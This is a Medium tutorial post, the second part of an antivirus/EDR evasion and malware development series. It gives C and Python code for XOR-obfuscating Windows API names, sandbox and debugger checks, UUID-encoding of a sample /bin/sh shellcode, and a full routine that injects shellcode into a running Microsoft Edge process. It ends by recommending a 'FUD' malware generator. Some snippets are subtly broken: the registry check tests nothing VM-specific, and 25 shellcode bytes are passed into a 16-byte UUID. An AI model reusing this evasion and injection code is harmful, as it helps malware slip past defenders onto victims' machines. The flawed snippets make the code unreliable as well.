# https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p2-7a947f7db354&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p2-7a947f7db354&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# [AV/EDR Evasion](https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5) \| Malware Development — P2

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---byline--7a947f7db354---------------------------------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---byline--7a947f7db354---------------------------------------)

Follow

10 min read

·

Feb 18, 2023

552

2

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D7a947f7db354&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p2-7a947f7db354&source=---header_actions--7a947f7db354---------------------post_audio_button------------------)

Share

## Hello, We talked in the first part of the writeup some basics like how av detect malwares, what is evasion techniques, and we make a small part of the malware that we encrypt the shellcode and what is the .

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*9Z0gNggyx-fIBn8exIbx-w.png)

Hey, We Go Back Again! ;)

In this writeup is continuing the first part of “EDR Evasion” that it will be your first steps in Malware Development & Anti-Virus Evasion, Anti-Virus Evasion is important topic in “Red Team Operations” that after you have gaining access you will consider that there is AV so how to bypass it or evade it this is the thing that we will talk about today.

Note: I don’t want you to be a script kiddie so I will never write the completed code, if you understand me well you will write it by yourself…

## Today’s Topics:

1. How to Obfuscate functions
2. Simple XOR Function Encryptor
3. How to handle your code & What is MSDN API
4. What is Sandbox Evasion & How to implement it in C
5. What is Anti-Debugging & C Implementation
6. UUIDs Shellcode Encryption
7. Process Injection in C
8. Resources will help you in learning “Malware Development”

Now let’s continue after we stop, “Function call obfuscation” as we said that there are some functions in the code are blacklisted to the Anti-Virus like:

- **VirtualAlloc**
- **CreateThread**
- **RtlMoveMemory**
- **WaitForSingleObjet**

### We need to obfuscate it so what we will do!

Microsoft allows us to use something called an API that you can search for, and it is called “MSDN”, and through it we can define the function without using it, then encrypt the name of the function and decrypt it, which is the knowledge that its name is something from the three that I mentioned …

You didn’t understand anything right? I assure you of this. You can take look of this documentation this is the MSDN API that we will use : [VirtualAlloc function (memoryapi.h) — Win32 apps \| Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

Ok we need to handle it in the code to define it as a pointer in WINAPI, we have two techniques but I will give you the easier but it gives us a small warning after compiling it.

```
LPVOID (WINAPI * pVirtualAlloc) (
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

We add only (WINAPI \* VirtualAlloc), and don’t forget to remove \[in\] because we don’t need it and if you want to delete spaces delete it.

Ok, now we need to encrypt without script “VirtualAlloc”, and we need to modify something in the python XOR encryptor code to be like this:

```
data = "VirtualAlloc"
key  = 0x1

print('{ ', end='')
for i in data:
    print(hex(ord(i) ^ key), end=', ')

print("0x0 };")
```

In this Python code it takes the string “VirtualAlloc” and performs a simple bitwise XOR operation on each character with a hexadecimal key value of 0x1 (which is equal to decimal 1). The result of the XOR operation is then printed in hexadecimal format.

The output is a series of comma-separated hexadecimal values enclosed in curly braces, representing the encrypted string in a format that can be used in C/C++ code. The final value, “0x0,” is included to mark the end of the string.

Ok, now we make the VirtualAlloc encrypted with XOR Function and now we need to put it in variable for example “x” and then we started in the important part in the function obfuscation.

After we make the VirtualAlloc encrypted in variable called x we need to define it as the pVirtualAlloc that we put in the MSDN is the same of the x variable after Decryption, I will show you the code line then i will explain to understand me.

```
pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), x);
```

> We used windows API to dynamically load a function called `VirtualAlloc` from the `kernel32.dll` library.
>
> Code points:
>
> `GetProcAddress` is a Windows API function that retrieves the address of an exported function or variable from a dynamic-link library (DLL) or executable (EXE) file.
>
> `GetModuleHandle` is another Windows API function that retrieves a handle to a loaded module, such as a DLL. it's used to get a handle to the `kernel32.dll` library.
>
> `"kernel32.dll"` is the name of the DLL that contains the function we want to load.
>
> So, when this line of code is executed, it looks for the address of the `VirtualAlloc` function in the `kernel32.dll` library and stores it in the `pVirtualAlloc` variable. From there, the `VirtualAlloc` function can be called using the `pVirtualAlloc` pointer.

Note: Remember and don’t forget to put the decryption function before writing this line also the encrypted VirtualAlloc in variable.

## Congratulations You Now Learned How to Obfuscate Your First Function!

Now you know how to obfuscate VirtualAlloc, your task now is obfuscating the second and third functions with this same technique.

### Again, What We Do:

1 — We search for the name of the function then MSDN for example “CreateThread MSDN” in google

2 — We encrypt the function name with the XOR Python script

3 — Put your decrypt function and don’t forget the SIZEOF() because it is some of bytes

4 — Import it in the kernel32 with GetModuleHandle(GetProcAddress(“Kernel32.dll”))

## Get Hossam Ehab’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

I wish it’s easy now.

## Sandbox Evasion!

> A sandbox is an isolated environment that can be used to test potentially malicious software or code without risking harm to the host system. It’s a common technique used by security researchers and software developers to analyze the behavior of suspicious programs and identify potential threats.
>
> Sandbox evasion refers to the techniques used by attackers to bypass or evade the security measures of a sandbox environment, in order to execute their malicious code undetected. For example, an attacker might use a packer or obfuscator to conceal the true nature of their code, making it harder for the sandbox to identify it as malicious. Alternatively, an attacker might use anti-analysis techniques to detect if their code is running in a sandbox, and modify its behavior accordingly.
>
> Sandbox evasion is important for attackers because it allows them to test and refine their attacks in a safe environment, without being detected by security tools. By evading sandboxes, attackers can increase the likelihood of their malware successfully compromising the target system, which can result in data theft, financial loss, and other serious consequences.
>
> On the other hand, it’s important for security researchers and software developers to be aware of sandbox evasion techniques in order to improve their sandboxing technologies and make them more effective. By understanding how attackers can bypass sandboxing, researchers can develop more robust and resilient security measures that are better able to detect and prevent malicious code from running undetected.

## Useful Summary:

Sandbox evasion is important for any hacker to hide himself from malware analyst to complexing finding him, Also is complexing the process of AV detection and you also will get great detection rate!

I write before some of sandbox evasion implemented in C. You can find it from here → facebook.com/photo/fbid=156828207144505&set=a.115014454659214

But now let’s put any technique in our code for example this technique.

```
int main()
{
// Open the registry key
HKEY hKey;
LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion"), 0, KEY_READ, &hKey);
if (lResult != ERROR_SUCCESS)
exit(0);

// Check if a specific value exists in the registry key
DWORD dwType, dwData;
DWORD dwDataSize = sizeof(dwData);
lResult = RegQueryValueEx(hKey, _T("ProductId"), NULL, &dwType, (LPBYTE) &dwData, &dwDataSize);
if (lResult != ERROR_SUCCESS)
exit(0);

return 0;
}
```

This code is checking the registry if he found himself in VMM Environment he will exit and close the program.

Also I love this technique, it is not normal is there is no files in “Downloads” and “Desktop Folder” Right!?, Of Course and this script is checking for it:

```

int main()
{
// Get the number of files in the Desktop folder
TCHAR szPath[MAX_PATH];
SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, szPath);
HANDLE hFind;
WIN32_FIND_DATA fd;
int nCount = 0;

hFind = FindFirstFile(szPath, &fd);
if (hFind != INVALID_HANDLE_VALUE)
{
do
{ if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
nCount++;
} while (FindNextFile(hFind, &fd));
FindClose(hFind);
}

// Check if the number of files in the Desktop folder is 0
if (nCount == 0)
exit(0);

return 0;
}
```

Note: Hey don’t forget to obfuscate the functions that is in this code :) and the code that before this code :).

## Now, There is very Important thing, Anti-Debugging!

> Anti-debugging is a set of techniques used to prevent debugging and analysis of a program’s code, often used by developers and malware authors to protect their intellectual property or evade detection.
>
> Why is anti-debugging important? Anti-debugging is important because it can help protect sensitive code and prevent intellectual property theft for legitimate developers. For malware authors, anti-debugging can help evade detection and analysis by security researchers, antivirus programs, and other security tools.

So, You know understanded what is Anti-Debugging so how we can implement it in C?

```

     // Check if a debugger is attached
     if (IsDebuggerPresent())
     {
         printf("Debugger is attached, exiting the process...\n");
         ExitProcess(0);
     }
     else
     {
         printf("Debugger is not attached, continuing...\n");
     }
```

Don't forget for every technique there are millions of algorithms and techniques of typing the code.

## The last topic today is the UUID.

The UUID is used in shellcode obfuscation and it’s very nice technique. Let’s try to make it!, when you search in google for python scipt encrypt the shellcode bytes in hexadecimal into the UUID this is example for it

```
import uuid

# Define the shellcode to encrypt
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

# Define the encryption key
key = 0x23

# Encrypt the shellcode using XOR
encrypted_shellcode = bytes([b ^ key for b in shellcode])

# Generate a UUID from the encrypted shellcode
uuid_obj = uuid.UUID(bytes=encrypted_shellcode)

# Print the UUID in string format
print(str(uuid_obj))
```

Note: you need to make a loop in the shellcode and obfuscate every 16 byte and save it in array. :)

And then you need to decrypt it to be understanded from computer, exactly like the first shellcode encrypting techniques with XOR we need to decrypt it.

In this example, the encrypted UUID is defined as a `uuid_t` object using the `uuid_parse()` function. This UUID was previously generated by encrypting a shellcode and converting the resulting byte string to a UUID using the `uuid.UUID(bytes=encrypted_shellcode)` function in Python.

The `decrypt_shellcode()` function is then called with the encrypted UUID, encryption key, and length of the original shellcode. The resulting shellcode is printed out in hexadecimal format using a `for` loop, and the memory used by the `shellcode` buffer is freed :

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <uuid/uuid.h>

unsigned char* decrypt_shellcode(uuid_t uuid, int key, int shellcode_len);

int main() {
    // Define the UUID to be decrypted
    uuid_t encrypted_uuid;
    uuid_parse("1e6a2c6f-7616-4729-aa5d-fa5e6b5a21e5", encrypted_uuid);

    // Decrypt the shellcode and print it out
    int key = 0x23;
    int shellcode_len = 23;
    unsigned char* shellcode = decrypt_shellcode(encrypted_uuid, key, shellcode_len);
    printf("Decrypted shellcode: ");
    for (int i = 0; i < shellcode_len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Free the decrypted shellcode buffer
    free(shellcode);

    return 0;
}
```

Now Let’s see How to Implement Process injection in C!

First as we learned we will put our encrypted shellcode, and now let’s know how we will inject our shellcode into running process!

```
#include <windows.h>
#include <tlhelp32.h>

BOOL IsProcessRunning(DWORD pid)
{
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    DWORD exitCode = 0;
    if (process != NULL)
    {
        GetExitCodeProcess(process, &exitCode);
        CloseHandle(process);
    }
    return exitCode == STILL_ACTIVE;
}

BOOL InjectShellcodeIntoEdge()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        do
        {
            if (lstrcmpi(entry.szExeFile, L"msedge.exe") == 0 && IsProcessRunning(entry.th32ProcessID))
            {
                HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, pShell_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
                PVOID exec_mem = remoteBuffer;
                WriteProcessMemory(processHandle, exec_mem, pShell, pShell_len, NULL);
                HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
                CloseHandle(remoteThread);
                CloseHandle(processHandle);
                return TRUE;
            }
        } while (Process32Next(snapshot, &entry) == TRUE);
    }

    CloseHandle(snapshot);

    return FALSE;
}

int main(int argc, char** argv)
{
    if (!InjectShellcodeIntoEdge())
    {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        CreateProcessA(NULL, (LPSTR)"msedge.exe", NULL, NULL, FALSE, 0, NULL, (LPCSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\", &si, &pi);
        WaitForInputIdle(pi.hProcess, INFINITE);
        InjectShellcodeIntoEdge();
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
```

Let’s explain this code :

> This code checks if the Microsoft Edge browser is running, and if so, injects shellcode into it. If it is not running, the code starts a new instance of the browser and then injects the shellcode into it.
>
> The first function `IsProcessRunning` takes a process ID as input and returns a boolean value indicating whether or not the process is still running. It uses the `OpenProcess` function to open a handle to the process with the specified ID and `GetExitCodeProcess` to get the exit code of the process. If the process is still running, the exit code will be `STILL_ACTIVE`. The function returns `TRUE` if the exit code is `STILL_ACTIVE`, and `FALSE` otherwise.
>
> The second function `InjectShellcodeIntoEdge` uses the toolhelp32 library to iterate over all running processes and checks if the process name is `msedge.exe` and if the process is still running. If so, it opens a handle to the process with `OpenProcess` using the `PROCESS_ALL_ACCESS` flag, allocates memory within the process with `VirtualAllocEx`, writes the shellcode into the allocated memory with `WriteProcessMemory`, creates a remote thread with `CreateRemoteThread`, and then closes the thread and process handles.
>
> The `main` function first calls `InjectShellcodeIntoEdge` to check if the browser is already running and inject the shellcode if it is. If the function returns `FALSE`, indicating that the browser is not running, it starts a new instance of the browser with `CreateProcessA`, waits for the process to start with `WaitForInputIdle`, injects the shellcode with `InjectShellcodeIntoEdge`, and then closes the process and thread handles.
>
> The code makes use of several functions from the Windows API, including `CreateToolhelp32Snapshot`, `Process32First`, `Process32Next`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, and `CloseHandle`. It also includes a shellcode that is injected into the browser process.

So, this technique you will do not find many people use this technique, you will find injecting into a PID process… you can also search for it :)

## Resources will help you in learning.

- Ired Team — Defense Evasion & Code, Process injection : [https://www.ired.team/offensive-security/defense-evasion](https://www.ired.team/offensive-security/defense-evasion)

[https://www.ired.team/offensive-security/code-injection-process-injection](https://www.ired.team/offensive-security/code-injection-process-injection)
- Cocomelonc — Malware development & AV Evasion : [https://cocomelonc.github.io/](https://cocomelonc.github.io/)
- 0xPat : [https://0xpat.github.io/](https://0xpat.github.io/)
- Sektor7 : [https://institute.sektor7.net/](https://institute.sektor7.net/) → they are the best people that explaining and teaching malware development

This is the result after using all techniques together but note → You can make the shellcode more encrypted because it still look like malicious so use can use UUID encrypting you can search for it :)

PoC :

![](https://miro.medium.com/v2/resize:fit:580/0*8832Uauae3s-Bjqt)

I would like to thank Abdallah Mohammed for helping me in my journey to learn malware development also if you want to study more the best thing that you can do is studing or reading this nice tool created by Abdallah is a FUD Malware generator is a powerfull tool uses many advanced technique in EDR evasion ^\_^ :

[https://github.com/0xNinjaCyclone/hellMaker](https://github.com/abdallah-elsharif/hellMaker)

And also, thanks to Abdulrahman Mohammed for encouraging me in my journey, he has a nice tools that also recommend if you want to learn malware development you can check his profile from here → De3vil (Abdulrahman Mohammed) (github.com), He will help you if you need a help in malware development in python ^\_^.

I wish you are here and thank you all for reading :)

[Av Evasion](https://medium.com/tag/av-evasion?source=post_page-----7a947f7db354---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----7a947f7db354---------------------------------------)

[Malware Development](https://medium.com/tag/malware-development?source=post_page-----7a947f7db354---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----7a947f7db354---------------------------------------)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:48:48/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---post_author_info--7a947f7db354---------------------------------------)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---post_author_info--7a947f7db354---------------------------------------)

Follow

[**Written by Hossam Ehab**](https://medium.com/@0xHossam?source=post_page---post_author_info--7a947f7db354---------------------------------------)

[638 followers](https://medium.com/@0xHossam/followers?source=post_page---post_author_info--7a947f7db354---------------------------------------)

· [101 following](https://medium.com/@0xHossam/following?source=post_page---post_author_info--7a947f7db354---------------------------------------)

Red Team Operator @ Cyshield. LinkedIn -> [linkedin.com/in/0xHossam](http://linkedin.com/in/0xHossam) \| interested in malware & windows security research \| [x.com/0xHossam](http://x.com/0xHossam)

Follow

## Responses (2)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p2-7a947f7db354&source=---post_responses--7a947f7db354---------------------respond_sidebar------------------)

Cancel

Respond

[![Psocik](https://miro.medium.com/v2/resize:fill:32:32/0*A_9hhvFSkWq2zuJR)](https://medium.com/@psocik89?source=post_page---post_responses--7a947f7db354----0-----------------------------------)

[Psocik](https://medium.com/@psocik89?source=post_page---post_responses--7a947f7db354----0-----------------------------------)

[Aug 19, 2025](https://medium.com/@psocik89/hay-que-aclarar-que-son-dos-archivos-bin-461c9f99fcbd?source=post_page---post_responses--7a947f7db354----0-----------------------------------)

```
Hay que aclarar que son dos archivos .bin y el otro que hace el la inyeccion del codigo o sea que funciona como loader. a veces cuando comienza se le dificulta. Me paso por eso ajjaa
```

Reply

[![Omar Ahmed Shaaban](https://miro.medium.com/v2/resize:fill:32:32/0*40g3p6avjv4Vj8Py)](https://medium.com/@omarahmedshaaban?source=post_page---post_responses--7a947f7db354----1-----------------------------------)

[Omar Ahmed Shaaban](https://medium.com/@omarahmedshaaban?source=post_page---post_responses--7a947f7db354----1-----------------------------------)

[Apr 11, 2023 (edited)](https://medium.com/@omarahmedshaaban/for-a-kid-from-alex-thats-15-17-years-old-that-s-pretty-remarkable-kid-well-done-liked-your-a46bd9ad1d9?source=post_page---post_responses--7a947f7db354----1-----------------------------------)

```
for a kid from alex that's 15~17 years old that's pretty remarkable , well done , liked your implementation from ired team
```

Reply

## More from Hossam Ehab

![PowerShell Exploits — Modern APTs and Their Malicious Scripting Tactics](https://miro.medium.com/v2/resize:fit:679/format:webp/1*x-Znot5b8frVpDTar4310A.jpeg)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----0---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----0---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

Feb 14, 2025

[A clap icon890\\
\\
A response icon6](https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c?source=post_page---author_recirc--7a947f7db354----0---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

![AV/EDR Evasion | Malware Development](https://miro.medium.com/v2/resize:fit:679/format:webp/1*8PfEF1XfP6QdDN-owGlEyg.png)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----1---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----1---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

Feb 17, 2023

[A clap icon720\\
\\
A response icon1](https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5?source=post_page---author_recirc--7a947f7db354----1---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

![Evading Detection and Stealthy Data Exfiltration with DNS over HTTPS (DoH)](https://miro.medium.com/v2/resize:fit:679/format:webp/0*ZSN3XwGdRR1AsG8-)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----2---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----2---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

Jun 27, 2024

[A clap icon564](https://medium.com/@0xHossam/evading-detection-and-stealthy-data-exfiltration-with-dns-over-https-doh-ee134b5766d4?source=post_page---author_recirc--7a947f7db354----2---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

![AV/EDR Evasion | Malware Development P — 4](https://miro.medium.com/v2/resize:fit:679/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----3---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354----3---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

May 27, 2023

[A clap icon419\\
\\
A response icon1](https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e?source=post_page---author_recirc--7a947f7db354----3---------------------9731082a_9045_45df_851b_da4c3719b431--------------)

[See all from Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--7a947f7db354---------------------------------------)

## Recommended from Medium

![Breaking Boundaries: Mastering Windows Privilege Escalation with Boxes](https://miro.medium.com/v2/resize:fit:679/format:webp/1*IgYHuhuq4NtiYuAm9xJOSQ.jpeg)

[![RootRouteway](https://miro.medium.com/v2/resize:fill:20:20/1*1NJ0Ca228T14MgWbflZ3IA.jpeg)](https://medium.com/@RootRouteway?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

[RootRouteway](https://medium.com/@RootRouteway?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

Nov 9, 2025

[A clap icon9\\
\\
A response icon2](https://medium.com/@RootRouteway/breaking-boundaries-mastering-windows-privilege-escalation-with-boxes-1ec73145f972?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

![React2Shell: The Critical Vulnerability That Shook the JavaScript World](https://miro.medium.com/v2/resize:fit:679/format:webp/eca3d3b5fb936ab346077b194b08a6b17f33c89eb76924469d110fa41d232cd3)

[![Aditya Kumar Tiwari](https://miro.medium.com/v2/resize:fill:20:20/1*BFLrjGA7JW2WJO7fUQD-_Q.png)](https://medium.com/@adityatiwariblogs?source=post_page---read_next_recirc--7a947f7db354----1---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

[Aditya Kumar Tiwari](https://medium.com/@adityatiwariblogs?source=post_page---read_next_recirc--7a947f7db354----1---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

Dec 18, 2025

![30 Days of Red Team: Day 19 — Network Pivoting: Reaching the Unreachable](https://miro.medium.com/v2/resize:fit:679/format:webp/1*KFHwqIAhrhLp6WjHcWRpbw.png)

[![30 Days of Red Team](https://miro.medium.com/v2/resize:fill:20:20/1*mDDxZ8b9SAK4X34fO8PVLQ.png)](https://medium.com/30-days-of-red-team?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

In

[30 Days of Red Team](https://medium.com/30-days-of-red-team?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

by

[Maxwell Cross](https://medium.com/@maxwellcross?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

Jan 24

[A clap icon7](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-19-network-pivoting-reaching-the-unreachable-bd082b3906a2?source=post_page---read_next_recirc--7a947f7db354----0---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

![AI-Powered Ransomware | LetsDefend | IDA](https://miro.medium.com/v2/resize:fit:679/format:webp/1*uhZY93GgUNKUGhgnwaFxrw.png)

[![Jose Praveen](https://miro.medium.com/v2/resize:fill:20:20/1*hIgXQ1xz9GMoeKWlfGQJsA.png)](https://medium.com/@josepraveen?source=post_page---read_next_recirc--7a947f7db354----1---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

[Jose Praveen](https://medium.com/@josepraveen?source=post_page---read_next_recirc--7a947f7db354----1---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

6d ago

![Using a Golang Shellcode Loader with Sliver C2 to Evade Antivirus](https://miro.medium.com/v2/resize:fit:679/format:webp/1*dBX24yL9U5zRKFYVqkjS_g.png)

[![lainkusanagi](https://miro.medium.com/v2/resize:fill:20:20/1*VzJHRBQO-U0LwAINk4bE1A.png)](https://medium.com/@luisgerardomoret_69654?source=post_page---read_next_recirc--7a947f7db354----2---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

[lainkusanagi](https://medium.com/@luisgerardomoret_69654?source=post_page---read_next_recirc--7a947f7db354----2---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

Jan 17

[A clap icon46](https://medium.com/@luisgerardomoret_69654/using-a-golang-shellcode-loader-with-sliver-c2-for-evasion-43a95f5ebc35?source=post_page---read_next_recirc--7a947f7db354----2---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

![Active Directory Penetration Testing](https://miro.medium.com/v2/resize:fit:679/format:webp/1*hR4E7AMKl1dOo1rZDj-Dfg.png)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:20:20/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://medium.com/bugbountywriteup?source=post_page---read_next_recirc--7a947f7db354----3---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

In

[InfoSec Write-ups](https://medium.com/bugbountywriteup?source=post_page---read_next_recirc--7a947f7db354----3---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

by

[Andrey Pautov](https://medium.com/@1200km?source=post_page---read_next_recirc--7a947f7db354----3---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

Jan 26

[A clap icon15](https://medium.com/bugbountywriteup/active-directory-penetration-testing-745cfb31d7d3?source=post_page---read_next_recirc--7a947f7db354----3---------------------05455de1_6984_416d_90bc_bae1186f687f--------------)

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--7a947f7db354---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----7a947f7db354---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----7a947f7db354---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----7a947f7db354---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----7a947f7db354---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----7a947f7db354---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----7a947f7db354---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----7a947f7db354---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----7a947f7db354---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----7a947f7db354---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)